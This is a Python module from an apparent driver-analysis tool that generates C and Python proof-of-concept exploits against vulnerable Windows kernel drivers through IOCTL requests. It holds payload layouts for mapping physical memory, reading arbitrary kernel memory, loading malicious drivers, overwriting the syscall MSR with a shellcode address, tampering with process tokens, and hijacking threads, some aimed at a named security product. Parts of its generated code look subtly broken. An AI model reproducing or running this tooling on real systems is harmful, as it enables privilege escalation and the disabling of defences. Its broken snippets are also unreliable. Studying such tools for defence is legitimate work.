"""DriverScope — PoC Generator.

Generates executable Proof-of-Concept code (C and Python) for confirmed
BYOVD exploit chains. Uses taint analysis results to construct input
buffers that trigger the dangerous API calls.

Enhanced v2: API-specific struct packing, METHOD_NEITHER pointer handling,
integer overflow bypass construction.

Usage:
    from src.report.poc_generator import generate_poc
    generate_poc(chains, device_name="TargetDriver", format="c", output_path=Path("poc.c"))
"""

from __future__ import annotations

import json
import struct
from pathlib import Path
from typing import Any


# ---------------------------------------------------------------------------
# IOCTL method constants
# ---------------------------------------------------------------------------

METHOD_NAMES = {
    0: "METHOD_BUFFERED",
    1: "METHOD_IN_DIRECT",
    2: "METHOD_OUT_DIRECT",
    3: "METHOD_NEITHER",
}

# ---------------------------------------------------------------------------
# C template
# ---------------------------------------------------------------------------

C_TEMPLATE = """/*
 * DriverScope Generated PoC — {chain_name}
 * Severity: {severity}
 *
 * WARNING: For educational and research purposes only.
 * This code demonstrates a confirmed BYOVD exploit path.
 * DO NOT use on production systems.
 *
 * Analysis metadata:
 *   Function: {function_addr}
 *   Dangerous APIs: {apis}
 *   Validation: {validation}
 *   Taint source: {taint_source}
 *   IOCTL method: {ioctl_method}
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define IOCTL_CODE  0x{ioctl_code:X}
#define DEVICE_NAME L"\\\\\\\\.\\\\{device_name}"

{extra_includes}

int main(int argc, char *argv[])
{{
    HANDLE hDevice;
    BOOL bResult;
    DWORD bytesReturned = 0;

    /* Open device handle */
    hDevice = CreateFileW(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {{
        printf("[-] Failed to open %ws (error: %lu)\\n",
               DEVICE_NAME, GetLastError());
        return 1;
    }}
    printf("[+] Successfully opened {device_name}\\n");

    /* Construct input buffer */
{input_buffer_code}

    /* Send IOCTL */
    printf("[*] Sending IOCTL 0x{ioctl_code:X} ({ioctl_method})\\n");
{ioctl_call}

    if (bResult) {{
        printf("[+] IOCTL succeeded (bytes returned: %lu)\\n", bytesReturned);
{output_handling}
    }} else {{
        printf("[-] IOCTL failed (error: %lu)\\n", GetLastError());
    }}

    CloseHandle(hDevice);
    return 0;
}}
"""

# ---------------------------------------------------------------------------
# Python template
# ---------------------------------------------------------------------------

PYTHON_TEMPLATE = '''"""
DriverScope Generated PoC — {chain_name}
Severity: {severity}

WARNING: For educational and research purposes only.
This code demonstrates a confirmed BYOVD exploit path.
DO NOT use on production systems.

Analysis metadata:
  Function: {function_addr}
  Dangerous APIs: {apis}
  Validation: {validation}
  Taint source: {taint_source}
  IOCTL method: {ioctl_method}

Usage: python poc.py
"""

import ctypes
from ctypes import wintypes

kernel32 = ctypes.windll.kernel32

IOCTL_CODE = 0x{ioctl_code:X}
DEVICE_NAME = "\\\\\\\\.\\\\\\\\{device_name}"

FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
FILE_ATTRIBUTE_NORMAL = 0x80

{extra_imports}

def main():
    # Open device handle
    h_device = kernel32.CreateFileA(
        DEVICE_NAME.encode(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        None
    )

    if h_device == -1 or h_device == 0xFFFFFFFF:
        print(f"[-] Failed to open {{DEVICE_NAME}} (error: {{kernel32.GetLastError()}})")
        return 1

    print(f"[+] Successfully opened {device_name}")

    # Construct input buffer
{input_buffer_code}

    # Send IOCTL
    print(f"[*] Sending IOCTL 0x{{IOCTL_CODE:X}} ({ioctl_method})")
{ioctl_call}

    if result:
        print(f"[+] IOCTL succeeded (bytes returned: {{bytes_returned.value}})")
{output_handling}
    else:
        print(f"[-] IOCTL failed (error: {{kernel32.GetLastError()}})")

    kernel32.CloseHandle(h_device)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
'''


def _extract_ioctl_code(chain: dict[str, Any]) -> int:
    """Extract the IOCTL code from a chain or use a default."""
    return chain.get("ioctl_code", 0x22A004)


def _extract_method(chain: dict[str, Any]) -> str:
    """Extract the IOCTL transfer method description."""
    method_code = chain.get("method", 0)
    return METHOD_NAMES.get(method_code, f"UNKNOWN({method_code})")


def _generate_input_buffer_c(chain: dict[str, Any]) -> str:
    """Generate C code for constructing the input buffer."""
    taint_sources = chain.get("taint_sources", [])
    buffer_size = chain.get("buffer_size", 0x1000)

    lines = [
        f"    BYTE inputBuffer[0x{buffer_size:X}] = {{0}};",
        "",
    ]

    if taint_sources:
        lines.append(f"    /* Taint sources identified by analysis: {', '.join(taint_sources)} */")
        for src in taint_sources:
            if "SystemBuffer" in str(src):
                lines.append(f"    /* SystemBuffer: METHOD_BUFFERED kernel copy, no user access check */")
            elif "UserBuffer" in str(src):
                lines.append(f"    /* UserBuffer: METHOD_NEITHER direct user pointer — probe required */")
        lines.append("")
        lines.append(f"    /* Fill buffer with controlled data to reach dangerous API */")
        lines.append(f"    memset(inputBuffer, 0x41, sizeof(inputBuffer));")
    else:
        lines.append(f"    /* No specific taint source identified — fill with pattern */")
        lines.append(f"    memset(inputBuffer, 0x41, sizeof(inputBuffer));")

    # Add offset-specific payloads if taint sinks are known
    taint_sinks = chain.get("taint_sinks", [])
    if taint_sinks:
        lines.append("")
        lines.append(f"    /* Taint sinks: {', '.join(taint_sinks)} */")

    return "\n".join(lines)


def _generate_input_buffer_python(chain: dict[str, Any]) -> str:
    """Generate Python code for constructing the input buffer."""
    buffer_size = chain.get("buffer_size", 0x1000)

    lines = [
        f"    input_buffer = bytearray(0x{buffer_size:X})",
        f"    # Fill with controlled data",
        f"    input_buffer[:] = b'{{0x41:02X}}' * len(input_buffer)",
    ]

    taint_sources = chain.get("taint_sources", [])
    if taint_sources:
        lines.append(f"    # Taint sources: {{', '.join(str(s) for s in {json.dumps(taint_sources)})}}")

    return "\n".join(lines)


def _generate_ioctl_call_c(chain: dict[str, Any], ioctl_code: int) -> str:
    """Generate C code for DeviceIoControl call."""
    method = chain.get("method", 0)

    if method == 0:  # METHOD_BUFFERED
        return f"""    bResult = DeviceIoControl(
        hDevice,
        IOCTL_CODE,
        inputBuffer,
        sizeof(inputBuffer),
        NULL,
        0,
        &bytesReturned,
        NULL
    );"""
    elif method == 3:  # METHOD_NEITHER
        return f"""    bResult = DeviceIoControl(
        hDevice,
        IOCTL_CODE,
        inputBuffer,
        sizeof(inputBuffer),
        NULL,
        0,
        &bytesReturned,
        NULL
    );
    /* METHOD_NEITHER: driver accesses UserBuffer directly without mapping */"""
    else:
        return f"""    BYTE outputBuffer[0x1000] = {{0}};
    bResult = DeviceIoControl(
        hDevice,
        IOCTL_CODE,
        inputBuffer,
        sizeof(inputBuffer),
        outputBuffer,
        sizeof(outputBuffer),
        &bytesReturned,
        NULL
    );"""


def _generate_ioctl_call_python(chain: dict[str, Any], ioctl_code: int) -> str:
    """Generate Python code for DeviceIoControl call."""
    method = chain.get("method", 0)

    if method == 0:  # METHOD_BUFFERED
        return f"""    bytes_returned = wintypes.DWORD(0)
    result = kernel32.DeviceIoControl(
        h_device,
        IOCTL_CODE,
        bytes(input_buffer),
        len(input_buffer),
        None,
        0,
        ctypes.byref(bytes_returned),
        None
    )"""
    else:
        return f"""    output_buffer = ctypes.create_string_buffer(0x1000)
    bytes_returned = wintypes.DWORD(0)
    result = kernel32.DeviceIoControl(
        h_device,
        IOCTL_CODE,
        bytes(input_buffer),
        len(input_buffer),
        output_buffer,
        len(output_buffer),
        ctypes.byref(bytes_returned),
        None
    )"""


def generate_poc(
    chains: list[dict[str, Any]],
    device_name: str,
    format: str = "c",
    output_path: Path | None = None,
) -> str:
    """Generate PoC code for one or more exploit chains.

    Args:
        chains: List of exploit chain dicts (from OvoidaResult.exploit_chains).
        device_name: Device name without prefix (e.g., "TargetDriver").
        format: Output format — "c" or "python".
        output_path: File to write. If None, returns the source string.

    Returns:
        Generated source code string.
    """
    if not chains:
        code = "// No exploit chains detected. No PoC generated.\n"
    elif format == "c":
        code = _generate_c_poc(chains[0], device_name)
    elif format == "python":
        code = _generate_python_poc(chains[0], device_name)
    else:
        raise ValueError(f"Unsupported format: {format}. Use 'c' or 'python'.")

    if output_path:
        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text(code, encoding="utf-8")

    return code


def _generate_c_poc(chain: dict[str, Any], device_name: str) -> str:
    """Generate C PoC from a single chain."""
    ioctl_code = _extract_ioctl_code(chain)
    method_name = _extract_method(chain)

    return C_TEMPLATE.format(
        chain_name=chain.get("name", "Unknown"),
        severity=chain.get("severity", "UNKNOWN"),
        function_addr=chain.get("function", "unknown"),
        apis=", ".join(chain.get("dangerous_apis", [])),
        validation=chain.get("validation", "unknown"),
        taint_source=", ".join(chain.get("taint_sources", ["N/A"])),
        ioctl_method=method_name,
        device_name=device_name,
        ioctl_code=ioctl_code,
        extra_includes="",
        input_buffer_code=_generate_input_buffer_c(chain),
        ioctl_call=_generate_ioctl_call_c(chain, ioctl_code),
        output_handling="",
    )


def _generate_python_poc(chain: dict[str, Any], device_name: str) -> str:
    """Generate Python PoC from a single chain."""
    ioctl_code = _extract_ioctl_code(chain)
    method_name = _extract_method(chain)

    return PYTHON_TEMPLATE.format(
        chain_name=chain.get("name", "Unknown"),
        severity=chain.get("severity", "UNKNOWN"),
        function_addr=chain.get("function", "unknown"),
        apis=", ".join(chain.get("dangerous_apis", [])),
        validation=chain.get("validation", "unknown"),
        taint_source=", ".join(chain.get("taint_sources", ["N/A"])),
        ioctl_method=method_name,
        device_name=device_name,
        ioctl_code=ioctl_code,
        extra_imports="",
        input_buffer_code=_generate_input_buffer_python(chain),
        ioctl_call=_generate_ioctl_call_python(chain, ioctl_code),
        output_handling="",
    )


# ---------------------------------------------------------------------------
# Enhanced PoC generation — API-specific payloads
# ---------------------------------------------------------------------------

# API-specific payload templates for targeted exploit construction
_API_PAYLOADS = {
    "MmMapIoSpaceEx": {
        "description": "Map physical memory into kernel space",
        "buffer_layout": [
            ("offset 0x00", "PhysicalAddress (QWORD)", "Target physical page, e.g., 0x0 for LAPIC"),
            ("offset 0x08", "NumberOfBytes (ULONG)", "Size to map, e.g., 0x1000"),
            ("offset 0x0C", "CacheType (ULONG)", "0=MmNonCached, 1=MmCached"),
        ],
    },
    "MmMapLockedPagesSpecifyCache": {
        "description": "Map locked pages with arbitrary cache attributes",
        "buffer_layout": [
            ("offset 0x00", "MemoryDescriptorList pointer", "User-controlled MDL pointing to arbitrary physical page"),
            ("offset 0x08", "AccessMode", "0=KernelMode (bypass UserMode check)"),
            ("offset 0x0C", "CacheType", "3=MmWriteCombined (bypass NX)"),
        ],
    },
    "MmCopyVirtualMemory": {
        "description": "Copy memory between arbitrary kernel processes",
        "buffer_layout": [
            ("offset 0x00", "SourceProcess (PEPROCESS)", "Target process handle (e.g., csrss.exe)"),
            ("offset 0x08", "SourceAddress (PVOID)", "Arbitrary kernel address to read"),
            ("offset 0x10", "TargetProcess (PEPROCESS)", "Current process"),
            ("offset 0x18", "TargetAddress (PVOID)", "User buffer for stolen data"),
            ("offset 0x20", "BufferSize (SIZE_T)", "Number of bytes to copy"),
        ],
    },
    "ZwLoadDriver": {
        "description": "Load an arbitrary kernel driver",
        "buffer_layout": [
            ("offset 0x00", "RegistryPath (UNICODE_STRING)", "Path to malicious driver registry key"),
            ("offset 0x10", "Buffer (wide string)", "Registry path data"),
        ],
    },
    "KeWriteMsr": {
        "description": "Write to Model-Specific Register",
        "buffer_layout": [
            ("offset 0x00", "MsrIndex (ULONG)", "Target MSR, e.g., 0xC0000082 (LSTAR/syscall target)"),
            ("offset 0x08", "Value (ULONG64)", "Value to write — e.g., shellcode address"),
        ],
    },
    "ZwSetInformationProcess": {
        "description": "Modify process token/privilege information",
        "buffer_layout": [
            ("offset 0x00", "ProcessHandle (HANDLE)", "Target process (e.g., current process)"),
            ("offset 0x08", "ProcessInformationClass", "ProcessToken or ProcessAccessToken"),
            ("offset 0x10", "ProcessInformation", "Modified token structure"),
        ],
    },
    "ObReferenceObjectByHandle": {
        "description": "Obtain kernel object handle for arbitrary type",
        "buffer_layout": [
            ("offset 0x00", "Handle (HANDLE)", "User-controlled handle value"),
            ("offset 0x08", "ObjectType", "Target object type (e.g., Process, Token)"),
            ("offset 0x0C", "AccessMode", "0=KernelMode (bypass validation)"),
        ],
    },
    # 360-specific: Object callback manipulation
    "ObRegisterCallbacks": {
        "description": "Register object access callback — 360 uses this to block process termination and VM access",
        "buffer_layout": [
            ("offset 0x00", "Version (ULONG)", "OB_CALLBACK_REGISTRATION version, typically 0x00000001"),
            ("offset 0x04", "OperationRegistrationCount (ULONG)", "Number of OB_OPERATION_REGISTRATION entries"),
            ("offset 0x08", "RegistrationContext (PVOID)", "User-controlled context pointer passed to callbacks"),
            ("offset 0x10", "Altitude (UNICODE_STRING)", "Filter manager altitude string"),
            ("offset 0x20", "OB_OPERATION_REGISTRATION[0].ObjectType", "PsProcessType or PsThreadType"),
            ("offset 0x28", "OB_OPERATION_REGISTRATION[0].Operations", "0x01=PRE, 0x02=POST"),
            ("offset 0x30", "OB_OPERATION_REGISTRATION[0].PreOperation", "Callback that strips TERMINATE/VM_READ rights"),
        ],
    },
    # 360-specific: Registry callback manipulation
    "CmRegisterCallback": {
        "description": "Register registry callback — 360 monitors/blocks registry changes to its config",
        "buffer_layout": [
            ("offset 0x00", "Function (PVOID)", "Callback function address"),
            ("offset 0x08", "Context (PVOID)", "User-controlled context"),
            ("offset 0x10", "Cookie (LARGE_INTEGER*)", "Output: unregister cookie"),
        ],
    },
    # 360-specific: APC injection
    "KeInsertQueueApc": {
        "description": "Queue APC to arbitrary thread — 360 injects code into target processes",
        "buffer_layout": [
            ("offset 0x00", "Apc (PKAPC)", "KAPC structure with KernelRoutine/NormalRoutine"),
            ("offset 0x08", "SystemArgument1", "Passed to callback — shellcode address"),
            ("offset 0x10", "SystemArgument2", "Passed to callback — parameter"),
            ("offset 0x18", "Environment", "UserMode (1) or KernelMode (0)"),
        ],
    },
    # Thread hijacking
    "ZwSetContextThread": {
        "description": "Modify thread register state — 360 hijacks threads for code execution",
        "buffer_layout": [
            ("offset 0x00", "ThreadHandle (HANDLE)", "Target thread handle"),
            ("offset 0x08", "Context (PCONTEXT)", "CONTEXT structure with modified Rip/Rcx"),
        ],
    },
}


def _generate_targeted_payload_c(chain: dict[str, Any]) -> str:
    """Generate C code for constructing a targeted input buffer based on dangerous API."""
    apis = chain.get("dangerous_apis", [])
    taint_sources = chain.get("taint_sources", [])
    taint_sinks = chain.get("taint_sinks", [])

    matched_api = None
    for api in apis:
        if api in _API_PAYLOADS:
            matched_api = api
            break

    lines = []
    if matched_api:
        info = _API_PAYLOADS[matched_api]
        buffer_size = chain.get("buffer_size", 0x100)
        lines.append(f"    /* Targeted payload for: {matched_api} */")
        lines.append(f"    /* {info['description']} */")
        c_struct = _get_c_struct_def(matched_api)
        if c_struct:
            lines.append(c_struct)
            lines.append("")
            struct_name = _get_struct_name(matched_api)
            lines.append(f"    {struct_name} payload = {{0}};")
            for offset, field, desc in info["buffer_layout"]:
                hex_val = _get_exploit_value_c(field, chain)
                lines.append(f"    // {offset}: {field} — {desc}")
                if hex_val:
                    field_name = field.split("(")[0].strip().replace(" ", "_")
                    lines.append(f"    payload.{field_name} = {hex_val};")
            lines.append("")
            lines.append(f"    BYTE inputBuffer[0x{buffer_size:X}] = {{0}};")
            lines.append(f"    memcpy(inputBuffer, &payload, min(sizeof(payload), sizeof(inputBuffer)));")
        else:
            lines.append(f"    BYTE inputBuffer[0x{buffer_size:X}] = {{0}};")
            lines.append(f"    memset(inputBuffer, 0x41, sizeof(inputBuffer));")
            for offset, field, desc in info["buffer_layout"]:
                lines.append(f"    // {offset}: {field} — {desc}")
    else:
        buffer_size = chain.get("buffer_size", 0x1000)
        api_list = ", ".join(apis) if apis else "unknown"
        lines.append(f"    /* Generic payload — no API-specific template for: {api_list} */")
        lines.append(f"    BYTE inputBuffer[0x{buffer_size:X}] = {{0}};")
        lines.append(f"    memset(inputBuffer, 0x41, sizeof(inputBuffer));")

    if taint_sources:
        lines.insert(1, f"    /* Taint sources: {', '.join(str(s) for s in taint_sources)} */")
    if taint_sinks:
        lines.append(f"    /* Taint sinks: {', '.join(str(s) for s in taint_sinks)} */")

    return "\n".join(lines)


def _generate_targeted_payload_python(chain: dict[str, Any]) -> str:
    """Generate Python code for constructing a targeted input buffer."""
    apis = chain.get("dangerous_apis", [])
    taint_sources = chain.get("taint_sources", [])
    taint_sinks = chain.get("taint_sinks", [])
    method = chain.get("method", 0)

    matched_api = None
    for api in apis:
        if api in _API_PAYLOADS:
            matched_api = api
            break

    lines = []
    if matched_api:
        info = _API_PAYLOADS[matched_api]
        buffer_size = chain.get("buffer_size", 0x100)
        lines.append(f"    # Targeted payload for: {matched_api}")
        lines.append(f"    # {info['description']}")
        lines.append(f"    input_buffer = bytearray(0x{buffer_size:X})")
        lines.append("")

        # Pack fields using struct
        pack_code = _pack_python_struct(matched_api, chain)
        if pack_code:
            lines.extend(pack_code)
        else:
            for offset, field, desc in info["buffer_layout"]:
                lines.append(f"    # {offset}: {field} — {desc}")
            lines.append("")
            lines.append(f"    # Fill with controlled pattern")
            lines.append(f"    input_buffer[:] = bytes([0x41] * len(input_buffer))")
    else:
        buffer_size = chain.get("buffer_size", 0x1000)
        api_list = ", ".join(apis) if apis else "unknown"
        lines.append(f"    # Generic payload — no API-specific template for: {api_list}")
        lines.append(f"    input_buffer = bytearray(0x{buffer_size:X})")
        lines.append(f"    input_buffer[:] = bytes([0x41] * len(input_buffer))")

    if taint_sources:
        lines.insert(1, f"    # Taint sources: {', '.join(str(s) for s in taint_sources)}")
    if taint_sinks:
        lines.append(f"    # Taint sinks: {', '.join(str(s) for s in taint_sinks)}")

    # METHOD_NEITHER: may need additional pointer setup
    if method == 3:
        lines.append("")
        lines.append("    # METHOD_NEITHER: driver accesses UserBuffer directly")
        lines.append("    # Input buffer is treated as a direct pointer — ensure valid address")

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# C struct definitions for API-specific PoC generation
# ---------------------------------------------------------------------------

_C_STRUCTS = {
    "MmMapIoSpaceEx": """    typedef struct {
        unsigned __int64 PhysicalAddress;
        unsigned long    NumberOfBytes;
        unsigned long    CacheType;
    } MM_MAP_IO_SPACE_INPUT;""",
    "MmMapLockedPagesSpecifyCache": """    typedef struct {
        void* Mdl;              // User-controlled MDL
        unsigned long AccessMode;  // 0 = KernelMode
        unsigned long CacheType;   // 3 = MmWriteCombined
    } MM_MAP_LOCKED_PAGES_INPUT;""",
    "MmCopyVirtualMemory": """    typedef struct {
        unsigned __int64 SourceProcess;   // PEPROCESS of target
        unsigned __int64 SourceAddress;   // Arbitrary kernel addr
        unsigned __int64 TargetProcess;   // Current process
        unsigned __int64 TargetAddress;   // User buffer
        unsigned __int64 BufferSize;
    } MM_COPY_VIRTUAL_MEMORY_INPUT;""",
    "KeWriteMsr": """    typedef struct {
        unsigned long  MsrIndex;   // e.g., 0xC0000082 (IA32_LSTAR)
        unsigned __int64 Value;    // Shellcode address
    } MSR_WRITE_INPUT;""",
    "ObReferenceObjectByHandle": """    typedef struct {
        void* Handle;             // User-controlled handle
        void* ObjectType;         // PsProcessType / PsThreadType
        unsigned long AccessMode; // 0 = KernelMode
    } OB_REFERENCE_INPUT;""",
}


def _get_c_struct_def(api: str) -> str:
    """Return C struct definition for the API, or empty string."""
    return _C_STRUCTS.get(api, "")


def _get_struct_name(api: str) -> str:
    """Return struct variable name for the API."""
    name_map = {
        "MmMapIoSpaceEx": "MM_MAP_IO_SPACE_INPUT",
        "MmMapLockedPagesSpecifyCache": "MM_MAP_LOCKED_PAGES_INPUT",
        "MmCopyVirtualMemory": "MM_COPY_VIRTUAL_MEMORY_INPUT",
        "KeWriteMsr": "MSR_WRITE_INPUT",
        "ObReferenceObjectByHandle": "OB_REFERENCE_INPUT",
    }
    return name_map.get(api, "")


def _get_exploit_value_c(field: str, chain: dict) -> str:
    """Return an exploit-relevant C value for the given field description."""
    field_lower = field.lower()
    # Extract override values from chain
    exploit_values = chain.get("exploit_values", {})
    for key, val in exploit_values.items():
        if key.lower() in field_lower:
            return f"0x{val:X}" if isinstance(val, int) else val

    # Default exploit values for common fields
    if "physical" in field_lower and "address" in field_lower:
        return "0x0"  # LAPIC page
    if "numberofbytes" in field_lower or "buffersize" in field_lower or "size" in field_lower:
        return "0x1000"
    if "cachetype" in field_lower:
        return "1"  # MmCached
    if "accessmode" in field_lower:
        return "0"  # KernelMode
    if "msrindex" in field_lower:
        return "0xC0000082"  # IA32_LSTAR
    if "sourceaddress" in field_lower or "targetaddress" in field_lower:
        return "0x0"
    if "handle" in field_lower:
        return "(void*)0xFFFFFFFFFFFFFFFF"
    if "objecttype" in field_lower:
        return "NULL"
    return ""


def _pack_python_struct(api: str, chain: dict) -> list[str] | None:
    """Generate Python struct.pack code for the API buffer.

    Returns list of code lines, or None if no packing available.
    """
    exploit_values = chain.get("exploit_values", {})

    pack_templates = {
        "MmMapIoSpaceEx": [
            "    import struct",
            "    # Pack: PhysicalAddress(Q), NumberOfBytes(I), CacheType(I)",
            '    header = struct.pack("<QII", 0x0, 0x1000, 1)  # LAPIC page',
            '    input_buffer[:len(header)] = header',
        ],
        "MmMapLockedPagesSpecifyCache": [
            "    import struct",
            "    # Pack: Mdl(Q), AccessMode(I), CacheType(I)",
            '    header = struct.pack("<QQII", 0x0, 0x0, 0x1, 3)  # Fake MDL, KernelMode, WriteCombined',
            '    input_buffer[:len(header)] = header',
        ],
        "MmCopyVirtualMemory": [
            "    import struct",
            "    # Pack: SourceProcess(Q), SourceAddress(Q), TargetProcess(Q), TargetAddress(Q), BufferSize(Q)",
            '    header = struct.pack("<5Q", 0x0, 0xFFFFF80000000000, 0xFFFFFFFFFFFFFFFF, 0x0, 0x1000)',
            '    input_buffer[:len(header)] = header',
        ],
        "KeWriteMsr": [
            "    import struct",
            "    # Pack: MsrIndex(I), Value(Q)",
            '    header = struct.pack("<IQ", 0xC0000082, 0x0)  # IA32_LSTAR',
            '    input_buffer[:len(header)] = header',
        ],
        "ObReferenceObjectByHandle": [
            "    import struct",
            "    # Pack: Handle(Q), ObjectType(Q), AccessMode(I)",
            '    header = struct.pack("<QQI", 0xFFFFFFFFFFFFFFFF, 0x0, 0)',
            '    input_buffer[:len(header)] = header',
        ],
        "ObRegisterCallbacks": [
            "    import struct",
            "    # Pack: Version(4), RegCount(4), Context(8), Altitude(16), ObjectType(8), Ops(4), PreOp(8)",
            '    header = struct.pack("<IIQ16sQIQ", 1, 1, 0, b"10000", 0x0, 1, 0x0)  # Process type, PRE op',
            '    input_buffer[:len(header)] = header',
        ],
        "CmRegisterCallback": [
            "    import struct",
            "    # Pack: Function(Q), Context(Q), Cookie(Q)",
            '    header = struct.pack("<3Q", 0x0, 0x0, 0x0)',
            '    input_buffer[:len(header)] = header',
        ],
    }

    return pack_templates.get(api)


def generate_poc_from_chain(
    chain: dict[str, Any],
    device_name: str,
    format: str = "python",
    output_path: Path | None = None,
) -> str:
    """Generate a targeted PoC from a single exploit chain.

    Uses API-specific payload templates when a match is found.
    Supports both METHOD_BUFFERED and METHOD_NEITHER transfer modes.

    Args:
        chain: Exploit chain dict (from OvoidaResult.exploit_chains).
        device_name: Device name without prefix.
        format: "c" or "python".
        output_path: File to write. If None, returns source string.

    Returns:
        Generated source code string.
    """
    ioctl_code = _extract_ioctl_code(chain)
    method_name = _extract_method(chain)

    if format == "c":
        input_buf = _generate_targeted_payload_c(chain)
        ioctl_call = _generate_ioctl_call_c(chain, ioctl_code)
        code = C_TEMPLATE.format(
            chain_name=chain.get("name", "Unknown"),
            severity=chain.get("severity", "UNKNOWN"),
            function_addr=chain.get("function", "unknown"),
            apis=", ".join(chain.get("dangerous_apis", [])),
            validation=chain.get("validation", "unknown"),
            taint_source=", ".join(chain.get("taint_sources", ["N/A"])),
            ioctl_method=method_name,
            device_name=device_name,
            ioctl_code=ioctl_code,
            extra_includes="",
            input_buffer_code=input_buf,
            ioctl_call=ioctl_call,
            output_handling="",
        )
    elif format == "python":
        input_buf = _generate_targeted_payload_python(chain)
        ioctl_call = _generate_ioctl_call_python(chain, ioctl_code)
        code = PYTHON_TEMPLATE.format(
            chain_name=chain.get("name", "Unknown"),
            severity=chain.get("severity", "UNKNOWN"),
            function_addr=chain.get("function", "unknown"),
            apis=", ".join(chain.get("dangerous_apis", [])),
            validation=chain.get("validation", "unknown"),
            taint_source=", ".join(chain.get("taint_sources", ["N/A"])),
            ioctl_method=method_name,
            device_name=device_name,
            ioctl_code=ioctl_code,
            extra_imports="",
            input_buffer_code=input_buf,
            ioctl_call=ioctl_call,
            output_handling="",
        )
    else:
        raise ValueError(f"Unsupported format: {format}. Use 'c' or 'python'.")

    if output_path:
        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text(code, encoding="utf-8")

    return code
